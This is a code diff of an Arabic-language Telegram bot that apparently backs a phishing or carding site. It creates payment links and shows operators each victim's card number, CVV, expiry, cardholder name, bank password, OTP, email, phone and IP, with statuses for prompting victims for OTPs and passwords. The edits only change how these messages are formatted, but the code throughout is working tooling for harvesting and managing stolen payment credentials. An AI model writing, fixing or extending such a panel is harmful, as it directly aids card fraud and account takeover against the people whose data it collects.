@@ -32,10 +32,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user.id not in ADMIN_IDS:
         ADMIN_IDS.add(user.id)
         await update.message.reply_text(
-            f"🎉 <b>تم تسجيلك كأدمن!</b>\n\n"
+            "🎉 <b>تم تسجيلك كأدمن!</b>\n\n"
             f"👤 الاسم: {user.first_name}\n"
             f"🆔 الـ ID: <code>{user.id}</code>\n\n"
-            f"من الآن رح تستقبل إشعارات الدفع هنا.",
+            "من الآن رح تستقبل إشعارات الدفع هنا.",
             parse_mode='HTML'
         )
     await show_menu(update, context)
@@ -69,7 +69,7 @@ async def send_payment_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     amount = context.args[0]
     payment_link = f"{WEBSITE_URL}?amount={amount}"
     await update.message.reply_text(
-        f"🔗 <b>رابط الدفع جاهز!</b>\n\n"
+        "🔗 <b>رابط الدفع جاهز!</b>\n\n"
         f"💰 المبلغ: ${amount}\n"
         f"🔗 الرابط: {payment_link}",
         parse_mode='HTML'
@@ -111,26 +111,29 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         status = payment.get('status', 'pending')
         status_emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(status, "⏳")
+        
+        # نستخدم + بدل f-string عشان نتجنب المشاكل
         text = (
-            f"📋 <b>تفاصيل العملية الكاملة</b>\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>رقم العملية:</b> <code>{pid}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"💳 <b>رقم البطاقة:</b> <code>{payment.get('card_number', 'غير متوفر')}</code>\n"
-            f"👤 <b>اسم صاحب البطاقة:</b> {payment.get('card_holder', 'غير متوفر')}\n"
-            f"📅 <b>تاريخ الانتهاء:</b> {payment.get('expiry_month', '??')}/{payment.get('expiry_year', '??')}\n"
-            f"🔒 <b>CVV:</b> <code>{payment.get('cvv', 'غير متوفر')}</code>\n"
-            f"🔑 <b>كلمة السر:</b> <code>{payment.get('password', 'غير متوفر')}</code>\n"
-            f"📱 <b>OTP:</b> <code>{payment.get('otp', 'غير متوفر')}</code>\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"💰 <b>المبلغ:</b> {payment.get('amount', '0')} {payment.get('currency', 'USD')}\n"
-            f"📧 <b>الإيميل:</b> {payment.get('email', 'غير متوفر')}\n"
-            f"📱 <b>الهاتف:</b> {payment.get('phone', 'غير متوفر')}\n"
-            f"🌐 <b>IP:</b> <code>{payment.get('ip', 'غير متوفر')}</code>\n"
-            f"⏰ <b>الوقت:</b> {payment.get('timestamp', 'غير متوفر')}\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📊 <b>الحالة:</b> {status_emoji} <b>{status.upper()}</b>"
+            "📋 <b>تفاصيل العملية الكاملة</b>\n\n"
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "🆔 <b>رقم العملية:</b> <code>" + pid + "</code>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "💳 <b>رقم البطاقة:</b> <code>" + str(payment.get('card_number', 'غير متوفر')) + "</code>\n"
+            "👤 <b>اسم صاحب البطاقة:</b> " + str(payment.get('card_holder', 'غير متوفر')) + "\n"
+            "📅 <b>تاريخ الانتهاء:</b> " + str(payment.get('expiry_month', '??')) + "/" + str(payment.get('expiry_year', '??')) + "\n"
+            "🔒 <b>CVV:</b> <code>" + str(payment.get('cvv', 'غير متوفر')) + "</code>\n"
+            "🔑 <b>كلمة السر:</b> <code>" + str(payment.get('password', 'غير متوفر')) + "</code>\n"
+            "📱 <b>OTP:</b> <code>" + str(payment.get('otp', 'غير متوفر')) + "</code>\n\n"
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "💰 <b>المبلغ:</b> " + str(payment.get('amount', '0')) + " " + str(payment.get('currency', 'USD')) + "\n"
+            "📧 <b>الإيميل:</b> " + str(payment.get('email', 'غير متوفر')) + "\n"
+            "📱 <b>الهاتف:</b> " + str(payment.get('phone', 'غير متوفر')) + "\n"
+            "🌐 <b>IP:</b> <code>" + str(payment.get('ip', 'غير متوفر')) + "</code>\n"
+            "⏰ <b>الوقت:</b> " + str(payment.get('timestamp', 'غير متوفر')) + "\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "📊 <b>الحالة:</b> " + status_emoji + " <b>" + status.upper() + "</b>"
         )
+        
         keyboard = []
         if status == 'pending':
             keyboard = [
@@ -149,13 +152,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             all_payments = {}
         filtered = {k: v for k, v in all_payments.items() if data == "all" or v.get('status') == data}
         if not filtered:
-            await query.edit_message_text(f"📭 لا توجد مدفوعات في هذا القسم!")
+            await query.edit_message_text("📭 لا توجد مدفوعات في هذا القسم!")
             return
-        text = f"📋 <b>المدفوعات ({len(filtered)})</b>\n\n"
+        text = "📋 <b>المدفوعات (" + str(len(filtered)) + ")</b>\n\n"
         keyboard = []
         for pid, p in list(filtered.items())[:10]:
             emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(p.get('status'), "⏳")
-            text += f"{emoji} <code>{pid[:10]}...</code> - ${p.get('amount', '0')}\n"
+            text += emoji + " <code>" + pid[:10] + "...</code> - $" + str(p.get('amount', '0')) + "\n"
             keyboard.append([InlineKeyboardButton(f"{emoji} {pid[:8]}... ${p.get('amount', '0')}", callback_data=f"view_{pid}")])
         keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
@@ -172,4 +175,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-        
+                
